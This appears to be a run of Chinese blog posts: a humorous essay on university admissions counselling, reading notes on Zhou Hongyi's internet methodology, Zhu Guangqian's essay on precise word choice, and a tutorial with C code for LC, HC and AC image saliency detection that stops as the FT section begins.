前两天做本科生招生，现场咨询的时候，家长们渴望又无助的眼神，饿虎扑食一般的抢夺招生资料，深深感染了我，我终于明白自己当时的分数给父母带来了多大的失落。我终于明白五百七八十分面对各个学校那么多专业那么多选择有多么茫然。好在当年一本有清华，二本有文理她们都不曾嫌弃过我，虽然我的分数离第一志愿就差200多分。其实说那么多也没什么用，好在大家都殊途同归，躺在吴家坟女子专修学院里安度晚年。
招生时候还有个奇遇，早上刚开始咨询，就有个小姑娘就坐在我们身边静静的听着，完后还怕我热，给我扇风，结果一发不可收拾从早扇到晚，期间默默的跟着我们蹭了两顿饭。据说她今年17，我掐指一算想起了《未成年人保护法》，我也是有身份证的人，然后就没有然后了。（后来学妹发短信告诉我她考了600分，真是厉害）
这么些天我有个感觉，我国的高中教育跟高等教育存在严重的脱节情况，高中没有很好的培养孩子们对各个专业的认识，高考完了两眼一抹黑的突然抛出来几百个专业，对没参与与过高等教育的学生和家长未免过于残忍了。
招生咨询的日子，有不少很有意思的家长，小心谨慎的问东问西。有个家长带着女儿天天往招办跑，同事们耐心细致的解答了他很多问题，他还是不放心，碰巧有次我急着喝水，他又来问我:
老师你说！金融到底是学啥我实在是搞不明白！？
**算账！**
那电子信息技术呢？
**通信！**
计算机科学与技术？
**写代码！**
电子商务？
**卖东西**
。。。
完后这位家长拍了了拍我的肩膀，露出手上的劳力士说，我问了这么多人，小伙子就你说的清楚，你贵姓？以后我女儿就交给你了！方便留个电话不？ 
对不起，不行。。。哈哈哈
最近碰见研究生阶段最后一门英语考试，上了考场管他会与不会酣畅淋漓的写完正好交卷， 现在油盐不进刀枪不入碰见考试也根本没有什么特殊的感觉，生活每天其实都在考试，中考高考考研总有人哄骗说人生决定论，其实每天所做的事情都在改变自己的人生，hard work pays off，世间的事大抵如此。
记得今年早些时候开运动会，有个小姑娘带着收音机，在操场边闭着眼睛忘我的演唱，《你是我的眼》。我跟飞哥不能抵抗如此入戏的萝莉放下老脸上前要求了一张合影，人生又完整了。
 
她忽然就提醒了我，生活里面需要自我陶醉，即使长大了，也一样。
安西教练有一句话，心死了比赛也就结束了，年龄见长，见识了各式各样的理想磨灭。我作为反面典型, 让多少人重获自信, 找到活下去的理由, 总而言之, 我对社会的贡献是大大的。这时候，我还能说，那家伙还没有丧失斗志。
红旗h7的广告词写的好：

我来自一个理想飞扬的年代。理想如同一面旗帜，在每个人心中飘扬。沿着理想这条路，我走了很多年。不管时代如何变迁，理想的动力从未改变。只要心中的旗帜始终飘扬，我就能忠于理想的方向，勇往前行。红旗，让理想飞扬。

我再补充一句：

青年，要永远忠于自己年轻时候的梦想。

鼓掌，散会！

作者简介：王雅宁，笔名，王大力，曾用名：流川枫，仙道彰，帅的惊动党中央，万千学姐伤我心，万千学妹伤我心等。英文名：season，shiter。 
90后，篮球手，砖业运动员，草根程序员，复制粘贴砖家，调试程序砖家。 
基层党务工作者，一贯秉持“毫不利人，专门利己，全心全意为人民服务。。。（此处省略2万字。。）”的工作原则，热爱祖国，拥护党的领导。 
著有《学妹二三事》《那些年摇过的学姐》《被学妹抛弃后如何保持冷静》《女教授办公室的日子》等畅销书深受广大读者喜爱。 
专业方向：XX动作片去除马赛克，添加马赛克，各种马赛克相关。三围重建，牙刷轮廓识别。。。 
详情咨询：+86159293******

THE END 
ALL RIGHTS RESERVED! 









文章大纲第一章 欢迎来到互联网时代第二章 互联网里的用户至上第三章 颠覆式创新第四章 免费时代第五章 体验为王第六章 互联网方法论附录 周鸿祎批注“遗失的乔布斯访谈”

周鸿祎个人简介：


周鸿祎这个人比较有争议，如果不是他，中国互联网的免费文化可能还不会像今天这样，免费，共享等等概念满天飞。
周教主的核心理念是说，如果使用软件的用户足够多，那么软件成本分摊到每位用户就是近似免费的，而软件完全可以通过赞助商，广告商的出资抵消这部分成本费用。所以对于软件产业来说，用户才是最重要的，有了用户就有了一切。
下面，让我们来快速围观一下老周和他的互联网方法论。

第一章 欢迎来到互联网时代


360推出免费杀毒，既让传统杀毒厂商愤怒，又让他们不解，同时心里又有一种看不起。他们愤怒的是，免费杀毒跟他们原先的竞争方式根本就不一样：以前他们打的是价格战，你便宜，我更便宜；以前是营销战，你有八大功能，我有十大亮点。但360这一次直接以零价格闯入市场，用户一分钱都不用花。我们发布360免费杀毒的当天晚上，一个传统杀毒公司的老板半夜打电话给我，说：鸿祎啊，你这是干啥呢？是要跟整个行业为敌吗？你这不是要砸我们的饭碗吗？你这是连锅都要端走了。


结果是，360免费杀毒推出三个月之后，就成功掀翻瑞星市场份额达到第一，半年之后用户量超过1亿。在互联网面前，传统杀毒厂商都成了不幸的火鸡。



第二章 互联网里的用户至上

观察现实，无论是脸谱网（Facebook）、推特（Twitter）还是谷歌，所有伟大的互联网公司都有巨大的用户基础。他们获得巨大用户基础的前提，是给用户提供了若干有价值的服务。


第三章 颠覆式创新


颠覆式创新，就像自然界的新陈代谢一样，不断把老的、旧的公司从行业中挤出去。所以，这种颠覆式创新已经成为美国硅谷的一个象征。 破坏和颠覆，都是强调打破原有的平衡，建立新秩序。但这两个词在中文里都是贬义词，因为中国文化崇尚平衡、稳定、和谐。一说颠覆式创新，我们的潜意识就会觉得是反动的东西，就不由自主地想到阶级敌人搞破坏。我有些时候受邀给一些单位讲互联网里的颠覆式创新。讲完后，有的领导就过来跟我握手说：小周，讲得挺好的嘛，只不过以后不要讲颠覆、讲破坏，影响社会和谐。


所有的颠覆式创新都不是敲锣打鼓来的，而是隐藏在一片噪声里。


我对颠覆式创新的另一种理解，就是一定要逆向思维，反向操作。苹果的口号是“think different”


反向思维，通过逆向操作，在用户体验和商业模式上创造一种新的游戏规则。


齐白石说过一句话：“学我者生，似我者死。”


做好产品服务消费者才是根本，用谁的技术、用什么技术都是手段而已。



第四章 免费时代


痛饮狂歌空度日，飞扬跋扈为谁雄



下面这一条摘抄是重点：必考内容，送分题
你究竟拿什么免费？
这个东西会不会成为一项基础服务？
通过免费能不能得到用户？
在得到用户和免费的基础上，有没有机会做出新的增值服务？
增值服务的用户愿意付费吗？
|---------
如果你能回答清楚这些问题，就是一个好的商业模式。



如果我手里有1 000万，在中国打一则广告连个响儿也没有，我还不如花1 000万做一款免费的互联网产品，给几千万用户用，这几千万用户用了我的产品，就建立了对我品牌的认知、忠诚、信任，这比广告有效得多。





我主张把创新从神坛上拉下来，从一些细微点上进行持续创新，这样反而更有效。



第五章 体验为王


乔布斯有一天给谷歌高管打电话，说苹果iOS有一个谷歌地图图标，放大多少倍之后，第三行一个像素颜色不对，他认为这影响了iOS的美观。这就是对细节的一种坚持。


我一直说，好的用户体验，要像针扎一样，给用户一个刺激。



第六章 互联网方法论


消费者永远会问你一个问题：我上你的网站，装你的软件，你解决我的什么问题？


你可以把这看成一种头脑体操：如果我是道路设计师，如果我来设计医院，如果我来设计遥控器、手机，我应该怎么做？这个思考的过程，就是一个提升自己对体验的感觉的过程。


比尔·盖茨曾经说过，初出茅庐的时候你要自尊干什么？



附录 周鸿祎批注“遗失的乔布斯访谈”


毕加索曾说过，“好的艺术家懂得复制，伟大的艺术家则擅长偷窃”，而我们不羞于窃取伟大的想法。


懂得测量人类骑自行车的效率，这让兀鹫甘拜下风，称霸整个排行榜。


所以要有一点理想主义色彩，才能支持你长期坚韧不拔地把一件事干下去。


无论嬉皮还是屌丝其实反映的都是一种心灵的自由，都是挑战权威，不遵守当时的规则。我觉得这才是苹果“think different”的思想和来源。



p.s.
致敬老周和他的360，中国互联网的搅局者！








郭沫若先生的剧本里婵娟骂宋玉说：“你是没有骨气的文人！”上演时他自己在台下听，嫌这话不够味，想在“没有骨气的”下面加“无耻的”三个字。一位演员提醒他把“是”改为“这”，“你这没有骨气的文人！”就够味了。他觉得这字改得很恰当。他研究这两种语法的强弱不同，“你是什么”只是单纯的叙述语，没有更多的意义，有时或许竟会“不是”；“你这什么”便是坚决的判断，而且还必须有附带语省略去了。根据这种见解，他把另一文里“你有革命家的风度”一句话改为“你这革命家的风度”。这是炼字的好例，我们不妨借此把炼字的道理研究一番。那位演员把“是”改为“这”，确实改的好，不过郭先生如果记得《水浒》，就会明白一般民众骂人，都用“你这什么”式的语法。石秀骂梁中书说：“你这与奴才做奴才的奴才！”杨雄醉骂潘巧云说：“你这贱人！你这淫妇！你这你这大虫口里倒涎！你这你这……”一口气就骂了六个“你这”。看看这些实例，“你这什么”倒不仅是“坚决的判断”，而是带有极端憎恶的惊叹语，表现着强烈的情感。“你是什么”便只是不带情感的判断。纵有情感也不能在文字本身上见出来。不过它也不一定就是“单纯的叙述语，没有更多的含义”。《红楼梦》里茗烟骂金荣说：“你是个好小子出来动一动你茗大爷！”这里“你是”含有假定语气，也带“你不是”一点讥刺的意味。如果改成“你这好小子！”神情就完全不对了。从此可知“你这”式语法并非在任何情形之下都比“你是”式语法都来得更有力。其次，郭先生援例把“你有革命家的风度” 改为“你这革命家的风度”，似乎改得并不很妥。“你这”式语法大半表示深恶痛嫉，在赞美时便不适宜。二、“是”在逻辑上是连接词，相当于等号。“有”的性质完全不同，在“你有革命家的风度”一句中，风度是动词的宾词。在“你这革命家的风度”中，风度便变成主词和“你（的）”平行。根本不成一句话。这番话不免罗嗦，但是我们原在咬文嚼字，非这样锱铢必较不可。咬文嚼字有时是一个坏习惯，所以这个成语的含义通常不很好。但是在文学，无论阅读或写作，我们必须有一字不肯放松的谨严。文学藉文字表现思想情感，文字上面有含糊，就显得思想还没有透彻，情感还没有凝炼。咬文嚼字，在表面上象只是斟酌文字的分量，在实际上就是调整思想和情感。从来没有一句话换一个说法而意味仍完全不变。例如《史记》李广射虎一段：“李广见草中石以为虎而射之，中石没镞，视之，石也。更复射，终不能入石矣”这本是一段好文章，王若虚在《史记辨惑》里说它“凡多三石字”，当改为：“以为虎而射之，没镞，既知其为石，因更复射，终不能入”。或改为“尝见草中有虎，射之，没镞，视之，石也”。在表面上似乎改得简洁些，却实在远不如原文，见“草中石，以为虎”并非“见草中有虎”原文“视之，石也”，有发现错误而惊讶的意味，改为“既知其为石”便失去这意味。原文“终不能复入石矣”有失望而放弃得很斩截的意味，改为“终不能入”便觉索然无味。这种分别，稍有文字敏感的人细心玩索一番，自会明白。一般人根本不了解文字和情感的密切关系，以为更改一两个字不过是要文字顺畅些或是漂亮些。其实更动了文字就同时更动了思想情感，内容和形式是相随而变的。姑举一个人人皆知的实例，韩愈在月夜里听见贾岛吟诗，有“鸟宿池边树，僧推月下门”两句，劝他把“推”字改为“敲”字。这段文字因缘古今传为美谈，于今人要把咬文嚼字的意思说得好听一点，都说“推敲”。古今人也都赞赏“敲”字比“推”字下得好，其实这不仅是文字上的分别同时也是意境上的分别。“推”固然显得鲁莽一点，但是它表示孤僧步月归寺门原来是他自己掩的，于今他推。他须自掩自推，足见寺里只有他孤零零的一个和尚。在这冷寂的场合，他有兴致出来步月，兴尽而返，独往独来，自在无碍。他也自有一副胸襟气度。“敲”就显得他拘礼些，也就显得寺里有人应门。 他仿佛是乘月夜访友，他自己不甘寂寞，那寺里假如不是热闹场合，至少也有一些温暖的人情。比较起来，“敲”的空气没有“推”的那么冷寂。就上句“鸟宿池边树”看来，“推”似乎比“敲”要调和些。“推”可以无声，“敲”就不免剥啄有声。惊起了宿鸟，打破了岑寂，也似乎频添了搅扰。所以我很怀疑韩愈的修改是否真如古今所称赏的那么妥当。究竟哪一种意境是贾岛当时在心里玩索而要表现的，只有他自己知道。如果他想到“推”而下“敲”字，或是想到“敲”而下“推”字，我认为那是不可能的事。所以问题不在“推”字和“敲”字哪一个比较恰当，而在哪一种境界是他当时所要说的而且与全诗调和的。在文字上“推敲”，骨子里实在是在思想情感上“推敲”。无论是阅读或是写作，字的难处在意义的确定与控制。字有直指的意义，有联想的意义。比如说“烟”，它的直指的意义见过燃烧体冒烟的人都会明白。只是它的联想的意义远离不易捉摸，它可以联想到燃烧弹，鸦片烟榻，庙里焚香，“一川烟水”“杨柳万条烟”“烟光凝而暮山紫”“蓝田日暖玉生烟”——种种境界。直指的意义载在字典，有如月轮，明显而确实;联想的意义是文字在历史过程上所累积的种种关系。有如轮外月晕，晕外霞光。其浓淡大小随人随时随地而各各不同，变化莫测。科学的文字越限于直指的意义就越精确，文学的文字有时却必须顾到联想的意义，尤其是在诗方面。直指的意义易用，联想的意义却难用，因为前者是固定的后者是游离的，前者偏于类型后者偏于个性。既是游离的个别的他就不易控制。而且它可以使意蕴丰富，也可以使意义含糊甚至支离。比如说苏东坡的“惠山烹小龙团”诗里三四两句“独携天上小团月，来试人间第二泉”“天上小团月”是由“小龙团”茶联想起来的，如果你不知道这个关联，原文就简直不通。如果你不了解明月照着泉水和清茶泡在泉水里那一点共同的情沁肺腑的意味，也就失去原文的妙处。这两句诗的妙处就在不即不离若隐若约之中。它比用“惠山泉水泡小龙团茶”一句话来得较丰富，也来得较含混有蕴藉。难处就在于含混中显得丰富，由“独携小龙团，来试惠山泉”变成“独携天上小团月，来试人间第二泉”。这是点铁成金，文学之所以为文学就在这一点生发上面。这是一个善用联想意义的例子，联想意义也是最易误用而生流弊。联想起于习惯，习惯老是喜欢走熟路，熟路抵抗力最低引诱性最大，一人走过人人就都跟着走，越走就越平滑俗滥。没有一点新奇的意味。字被人用得太滥也是如此。从前作诗文的人都依*“文料触机”，“幼学琼林”“事类统编”之类书籍。要找词藻典故，都到那里去乞灵。美人都是“柳腰桃面”“王嫱西施”，才子都是“学富五车才高八斗”，谈风景必是“春花秋月”，叙离别不外“柳岸灞桥，做买卖都有“端木遗风”，到现在用铅字排印数籍还是“付梓”“杀青”。象这样例子举不胜举。他们是从前人所谓“套语”，我们所谓“滥调”。一件事物发生时立即使你联想到一些套语滥调，而你也就安于套语滥调，毫不斟酌地使用它们，并且自鸣得意。这就是近代文艺心理学家所说的“套版反应”（stock response）。一个人的心理习惯如果老是倾向于套板反应，他就根本与文艺无缘。因为就作者说，“套版反应”和创造的动机是仇敌；就读者说，它引不起新鲜而真切的情趣。一个作者在用字用词上离不掉“套版反应”，在运思布局上面，甚至在整个人生态度方面也就难免如此。不过习惯力量的深度常非我们的意料所及。沿着习惯去做总比新创更省力，人生来有惰性。常使我们不知不觉的一滑就滑到“套板反应”里去。你如果随便在报章杂志或是尺牍宣言里面挑一段文章来分析，你就会发现那里面的思想情感和语言大半都由“套板反应”起来的。韩愈谈他自己做古文“惟陈言之务去”。这是一句最紧要的教训。语言跟着思维情感走，你不肯用俗滥的语言自然也就不肯用俗滥的思想情感；你遇事就会朝深一层去想，你的文章也就是真正是“作”出来的，不致落入下乘。以上只是随便举实例说明咬文嚼字的道理，例子举不尽道理也说不完。我希望读者从这粗枝大业的讨论中，可以领略运用文字所应有的谨严精神。本着这个精神，他随处留心玩索，无论是阅读或写作，就会逐渐养成创作和欣赏都必须的好习惯。它不能懒不能粗心，不能受一时兴会所生的幻觉迷惑而轻易自满。文学是艰苦的事，只有刻苦自励推陈翻新，时时求思想情感和语文的精炼与吻合，你才会逐渐达到艺术的完美。







四种简单的图像显著性区域特征提取方法-----> AC/HC/LC/FT。
分类： 
图像处理 2014-08-03 12:40 4088人阅读 
评论(4) 收藏 
举报
salient region detec显著性检测
laviewpbt  2014.8.3 编辑
Email：laviewpbt@sina.com   QQ：33184777
最近闲来蛋痛，看了一些显著性检测的文章，只是简单的看看，并没有深入的研究，以下将研究的一些收获和经验共享。
     先从最简单的最容易实现的算法说起吧：
1、 LC算法
参考论文：Visual Attention Detection in Video Sequences Using Spatiotemporal Cues。 Yun Zhai
 and Mubarak Shah.  Page 4-5。 
    算法原理部分见论文的第四第五页。
      When viewers watch a video sequence, they are attracted not only by the interesting events, but also sometimes by the interesting objects in still images. This is referred as the spatial attention. Based on the psychological studies, human perception
 system is sensitive to the contrast of visual signals, such as color, intensity and texture. Taking this as the underlying assumption, we propose an e±cient method for computing the spatial saliency maps using the color statistics of images. The algorithm
 is designed with a linear computational complexity with respect to the number of image pixels. The saliency map of an image is built upon the color contrast between image pixels. The saliency value of a pixel Ik in an image I is defined as,

     where the value of Ii is in the range of [0; 255], and || * ||represent the color distance metric。
要实现这个算法，只要有这个公式(7)就完全足够了。就是每个像素的显著性值是其和图像中其他的所有像素的某个距离的总和，这个距离一般使用欧式距离。
如果采用直接的公式定义，则算法的时间复杂度很高，这个的优化不用想就知道是直方图，我都懒得说了。
     注意这篇文章采用的一个像素的灰度值来作为显著性计算的依据。这样图像最多的像素值只有256种了。
     该算法的代码在HC对应的文章的附带代码里有，我这里贴出我自己的实现：
extern void Normalize(float *DistMap, unsigned char *SaliencyMap, int Width, int Height, int Stride, int Method = 0);

/// <summary>
/// 实现功能： 基于SPATIAL ATTENTION MODEL的图像显著性检测
///    参考论文： Visual Attention Detection in Video Sequences Using Spatiotemporal Cues。 Yun Zhai and Mubarak Shah.  Page 4-5。
///    整理时间： 2014.8.2
/// </summary>
/// <param name="Src">需要进行检测的图像数据，只支持24位图像。</param>
/// <param name="SaliencyMap">输出的显著性图像，也是24位的。</param>
/// <param name="Width">输入的彩色数据的对应的灰度数据。</param>
/// <param name="Height">输入图像数据的高度。</param>
/// <param name="Stride">图像的扫描行大小。</param>
/// <remarks> 基于像素灰度值进行的统计。</remarks>

void __stdcall SalientRegionDetectionBasedonLC(unsigned char *Src, unsigned char *SaliencyMap, int Width, int Height, int Stride)
{
    int X, Y, Index, CurIndex ,Value;
    unsigned char *Gray = (unsigned char*)malloc(Width * Height);
    int *Dist = (int *)malloc(256 * sizeof(int));
    int *HistGram = (int *)malloc(256 * sizeof(int));
    float *DistMap = (float *) malloc(Height * Width * sizeof(float));

    memset(HistGram, 0, 256 * sizeof(int));

    for (Y = 0; Y < Height; Y++)
    {
        Index = Y * Stride;
        CurIndex = Y * Width;
        for (X = 0; X < Width; X++)
        {
            Value = (Src[Index] + Src[Index + 1] * 2 + Src[Index + 2]) / 4;        //    保留灰度值，以便不需要重复计算
            HistGram[Value] ++;
            Gray[CurIndex] = Value;
            Index += 3;
            CurIndex ++;
        }
    }

    for (Y = 0; Y < 256; Y++)
    {
        Value = 0;
        for (X = 0; X < 256; X++) 
            Value += abs(Y - X) * HistGram[X];                //    论文公式（9），灰度的距离只有绝对值，这里其实可以优化速度，但计算量不大，没必要了
        Dist[Y] = Value;
    }
    
    for (Y = 0; Y < Height; Y++)
    {
        CurIndex = Y * Width;
        for (X = 0; X < Width; X++)
        {
            DistMap[CurIndex] = Dist[Gray[CurIndex]];        //    计算全图每个像素的显著性
            CurIndex ++;
        }
    }

    Normalize(DistMap, SaliencyMap, Width, Height, Stride);    //    归一化图像数据

    free(Gray);
    free(Dist);
    free(HistGram);
    free(DistMap);
}
算法效果：







这篇论文并没有提到是否在LAB空间进行处理，有兴趣的朋友也可以试试LAB的效果。
2、HC算法
参考论文： 2011 CVPR Global Contrast based salient region detection Ming-Ming Cheng
这篇论文有相关代码可以直接下载的，不过需要向作者索取解压密码 ，有pudn账号的朋友可以直接在pudn上下载，不过那个下载的代码是用 opencv的低版本写的，下载后需要自己配置后才能运行，并且似乎只有前一半能运行（显著性检测部分）。
      论文提出了HC和RC两种显著性检测的算法，我这里只实现了HC。
      在本质上，HC和上面的LC没有区别，但是HC考虑了彩色信息，而不是像LC那样只用像素的灰度信息，由于彩色图像最多有256*256*256种颜色，因此直接基于直方图技术的方案不太可行了。但是实际上一幅彩色图像并不会用到那么多种颜色，因此，作者提出了降低颜色数量的方案，将RGB各分量分别映射成12等份，则隐射后的图最多只有12*12*12种颜色，这样就可以构造一个较小的直方图用来加速，但是由于过渡量化会对结果带来一定的瑕疵。因此作者又用了一个平滑的过程。 最后和LC不同的是，作者的处理时在Lab空间进行的，而由于Lab空间和RGB并不是完全对应的，其量化过程还是在RGB空间完成的。
     我们简单看看这个量化过程，对于一幅彩色图像，减少其RGB各分量的值，可以用Photoshop的色调分离功能直接看到其结果，如下所示：    





原图：共有64330种颜色 色调分离  结果图：共有1143种颜色
（上图由于保存为JPG格式了，你们下载分析后实际颜色的数量肯定会有所不同了）。
对于上面的图，似乎觉得量化后区别不是特别大，但是我们在看一个例子：



  原图：172373种颜色 结果图：共有1143种颜色
      这种转换后的区别就比较大了，这就是作者说的瑕疵。
      在作者的附带代码中，有这个算法的实现，我只随便看了下，觉得写的比较复杂， 于是我自己构思了自己的想法。
      可以肯定的一点就是，为了加快处理速度必须降低图像的彩色信息量，但是我得控制这个降低的程度，那么我想到了我最那首的一些东西：图像的位深处理。在我的Imageshop中，可以将24位真彩色图像用尽量少的视觉损失降低为8位的索引图像。因此，我的思路就是这样，但是不用降低位深而已。
      那么这个处理的第一步就是找到彩色图像的中最具有代表性的颜色值，这个过程可以用8叉树实现，或者用高4位等方式获取。 第二，就是在量化的过程中必须采用相关的抖动技术，比如ordered dither或者FloydSteinberg error diffuse等。更进一步，可以超越8位索引的概念，可以实现诸如大于256的调色板，1024或者4096都是可以的，但是这将稍微加大计算量以及编码的复杂度。我就采用256种颜色的方式。量化的结果如下图：



原图：172373种颜色 结果图：共有256种颜色
可以看到256种颜色的效果比上面的色调分离的1143种颜色的视觉效果还要好很多的。
     从速度角度考虑，用8叉树得到调色板是个比较耗时的过程，一种处理方式就是从原图的小图中获取，一半来说256*256大小的小图获取的调色板和原图相比基本没有啥区别，不过这个获取小图的插值方式最好是使用最近邻插值：第一：速度快；第二：不会产生新的颜色。
     最后，毕竟处理时还是有视觉损失和瑕疵，在我的算法最后也是对显著性图进行了半径为1左右的高斯模糊的。
     贴出部分代码：
/// <summary>
/// 实现功能： 基于全局对比度的图像显著性检测
///    参考论文： 2011 CVPR Global Contrast based salient region detection  Ming-Ming Cheng
///               http://mmcheng.net/salobj/
///    整理时间： 2014.8.3
/// </summary>
/// <param name="Src">需要进行检测的图像数据，只支持24位图像。</param>
/// <param name="SaliencyMap">输出的显著性图像，也是24位的。</param>
/// <param name="Width">输入的彩色数据的对应的灰度数据。</param>
/// <param name="Height">输入图像数据的高度。</param>
/// <param name="Stride">图像的扫描行大小。</param>
///    <remarks> 在Lab空间进行的处理，使用了整形的LAB转换，采用抖动技术将图像颜色总数量降低为256种，在利用直方图计算出显著性查找表，最后采用高斯模糊降低量化后的颗粒感。</remarks>

void __stdcall SalientRegionDetectionBasedonHC(unsigned char *Src, unsigned char *SaliencyMap, int Width, int Height, int Stride)
{
    int X, Y, XX, YY, Index, Fast, CurIndex;
    int FitX, FitY, FitWidth, FitHeight;
    float Value;
    unsigned char *Lab = (unsigned char *) malloc(Height * Stride);
    unsigned char *Mask = (unsigned char *) malloc(Height * Width);
    float *DistMap = (float *) malloc(Height * Width * sizeof(float));
    float *Dist = (float *)malloc(256 * sizeof(float));
    int *HistGram = (int *)malloc(256 * sizeof(int));

    GetBestFitInfoEx(Width, Height, 256, 256, FitX, FitY, FitWidth, FitHeight);
    unsigned char *Sample = (unsigned char *) malloc(FitWidth * FitHeight * 3);

    InitRGBLAB();
    for (Y = 0; Y < Height; Y++)
        RGBToLAB(Src + Y * Stride, Lab + Y * Stride, Width);

    Resample (Lab, Width, Height, Stride, Sample, FitWidth, FitHeight, FitWidth * 3, 0);    //    最近邻插值

    RGBQUAD *Palette = ( RGBQUAD *)malloc( 256 * sizeof(RGBQUAD));
    
    GetOptimalPalette(Sample, FitWidth, FitHeight, FitWidth * 3, 256, Palette);

    ErrorDiffusionFloydSteinberg(Lab, Mask, Width, Height, Stride, Palette, true);            //    先把图像信息量化到较少的范围内，这里量化到256种彩色

    memset(HistGram, 0, 256 * sizeof(int));

    for (Y = 0; Y < Height; Y++)
    {
        CurIndex = Y * Width;
        for (X = 0; X < Width; X++)
        {
            HistGram[Mask[CurIndex]] ++;
            CurIndex ++;
        }
    }

    for (Y = 0; Y < 256; Y++)                                // 采用类似LC的方式进行显著性计算
    {
        Value = 0;
        for (X = 0; X < 256; X++) 
            Value += sqrt((Palette[Y].rgbBlue - Palette[X].rgbBlue)*(Palette[Y].rgbBlue - Palette[X].rgbBlue) + (Palette[Y].rgbGreen- Palette[X].rgbGreen)*(Palette[Y].rgbGreen - Palette[X].rgbGreen) + (Palette[Y].rgbRed- Palette[X].rgbRed)*(Palette[Y].rgbRed - Palette[X].rgbRed)+ 0.0 )  * HistGram[X];
        Dist[Y] = Value;
    }

    for (Y = 0; Y < Height; Y++)
    {
        CurIndex = Y * Width;
        for (X = 0; X < Width; X++)
        {
            DistMap[CurIndex] = Dist[Mask[CurIndex]];
            CurIndex ++;
        }
    }

    Normalize(DistMap, SaliencyMap, Width, Height, Stride);                //    归一化图像数据

    GuassBlur(SaliencyMap, Width, Height, Stride, 1);                    //    最后做个模糊以消除分层的现象
    
    free(Dist);
    free(HistGram);
    free(Lab);
    free(Palette);
    free(Mask);
    free(DistMap);
    free(Sample);
    FreeRGBLAB();
}
上述方式比直接的Bruce-force的实现方式快了NNNN倍，比原作者的代码也快一些。并且效果基本没有啥区别。







原图 HC结果,用时20ms 直接实现：150000ms 原作者的效果











我做的HC和原作者的结果有所区别，我没仔细看代码，初步怀疑是不是LAB空间的处理不同造成的，也有可能是最后的浮点数量化到[0,255]算法不同造成的。
三：AC算法
参考论文：Salient Region Detection and Segmentation Radhakrishna Achanta,
 Francisco Estrada, Patricia Wils, and Sabine SÄusstrunk 2008 , Page 4-5
这篇论文提出的算法的思想用其论文的一句话表达就是：
saliency is determined as the local contrast of an image region with respect to its neighborhood at various scales.
具体实现上，用这个公式表示：

以及：

其实很简单，就是用多个尺度的模糊图的显著性相加来获得最终的显著性。关于这个算法的理论分析，FT算法那个论文里有这样一段话：
     Objects that are smaller than a ﬁlter size are detected ompletely, while objects larger than a ﬁlter size are only artially detected (closer to edges). Smaller objects that are well detected by the smallest ﬁlter are detected by all three ﬁlters, while
 larger objects are only detected by the larger ﬁlters. Since the ﬁnal saliency map is an average of the three feature maps (corresponding to detections of he three ﬁlters), small objects will almost always be better highlighted.
    这个算法编码上也非常简单：
/// <summary>
/// 实现功能： saliency is determined as the local contrast of an image region with respect to its neighborhood at various scales
/// 参考论文： Salient Region Detection and Segmentation   Radhakrishna Achanta, Francisco Estrada, Patricia Wils, and Sabine SÄusstrunk   2008  , Page 4-5
///    整理时间： 2014.8.2
/// </summary>
/// <param name="Src">需要进行检测的图像数据，只支持24位图像。</param>
/// <param name="SaliencyMap">输出的显著性图像，也是24位的。</param>
/// <param name="Width">输入的彩色数据的对应的灰度数据。</param>
/// <param name="Height">输入图像数据的高度。</param>
/// <param name="Stride">图像的扫描行大小。</param>
/// <param name="R1">inner region's radius R1。</param>
/// <param name="MinR2">outer regions's min radius。</param>
/// <param name="MaxR2">outer regions's max radius。</param>
/// <param name="Scale">outer regions's scales。</param>
///    <remarks> 通过不同尺度局部对比度叠加得到像素显著性。</remarks>

void __stdcall SalientRegionDetectionBasedonAC(unsigned char *Src, unsigned char *SaliencyMap, int Width, int Height, int Stride, int R1, int MinR2, int MaxR2, int Scale)
{
    int X, Y, Z, Index, CurIndex;
    unsigned char *MeanR1 =(unsigned char *)malloc( Height * Stride);
    unsigned char *MeanR2 =(unsigned char *)malloc( Height * Stride);
    unsigned char *Lab = (unsigned char *) malloc(Height * Stride);
    float *DistMap = (float *)malloc(Height * Width * sizeof(float));

    InitRGBLAB();    
    for (Y = 0; Y < Height; Y++) 
        RGBToLAB(Src + Y * Stride, Lab + Y * Stride, Width);                    //    注意也是在Lab空间进行的

    memcpy(MeanR1, Lab, Height * Stride);
    if (R1 > 0)                                                                    //    如果R1==0，则表示就取原始像素
        BoxBlur(MeanR1, Width, Height, Stride, R1);

    memset(DistMap, 0, Height * Width * sizeof(float));

    for (Z = 0; Z < Scale; Z++)
    {
        memcpy(MeanR2, Lab, Height * Stride);
        BoxBlur(MeanR2, Width, Height, Stride, (MaxR2 - MinR2) * Z / (Scale - 1) + MinR2);
        for (Y = 0; Y < Height; Y++) 
        {
            Index = Y * Stride;
            CurIndex = Y * Width;
            for (X = 0; X < Width; X++)                    //    计算全图每个像素的显著性
            {
                DistMap[CurIndex] += sqrt( (MeanR2[Index] - MeanR1[Index]) * (MeanR2[Index] - MeanR1[Index]) + (MeanR2[Index + 1] - MeanR1[Index + 1]) * (MeanR2[Index + 1] - MeanR1[Index + 1]) + (MeanR2[Index + 2] - MeanR1[Index + 2]) * (MeanR2[Index + 2] - MeanR1[Index + 2]) + 0.0) ;
                CurIndex++;
                Index += 3;
            }
        }
    }
    
    Normalize(DistMap, SaliencyMap, Width, Height, Stride, 0);        //    归一化图像数据

    free(MeanR1);
    free(MeanR2);
    free(DistMap);
    free(Lab);
    FreeRGBLAB();
}
核心就是一个 boxblur,注意他也是在LAB空间做的处理。









以上检测均是在R1 =0 , MinR2 = Min(Width,Height) / 8 . MaxR2 = Min(Width,Height) / 2, Scale = 3的结果。
4、FT算法
参考论文： 
Frequency-tuned Salient Region Detection， Radhakrishna Achantay， Page 4-5, 2009 CVPR

这篇论文对显著性检测提出了以下5个指标：
           1、 Emphasize the largest salient objects.
           2、Uniformly highlight whole salient regions.
           3、Establish well-deﬁned boundaries of salient objects.
           4、Disregard high frequencies arising from texture, noise  and blocking artifacts.
           5、Efﬁciently output full resolution saliency maps.
    而起最后提出的显著性检测的计算方式也很简答 ：

       where I is the mean image feature vector, I!hc (x; y) is the corresponding image pixel vector value in the Gaussian blurred version (using a 55 separable binomial kernel) of the original image, and || *|| is the L2 norm.

这个公式和上面的五点式如何对应的，论文里讲的蛮清楚，我就是觉得那个为什么第一项要用平局值其实直观的理解就是当高斯模糊的半径为无限大时，就相当于求一幅图像的平均值了。
     这篇论文作者提供了M代码和VC的代码，但是M代码实际上和VC的代码是不是对应的, M代码是有错误的,他求平均值的对象不对。
     我试着用我优化的整形的LAB空间来实现这个代码，结果和原作者的效果有些图有较大的区别，最后我还是采用了作者的代码里提供的浮点版本的RGBTOLAB。
     相关参考代码如下：
/// <summary>
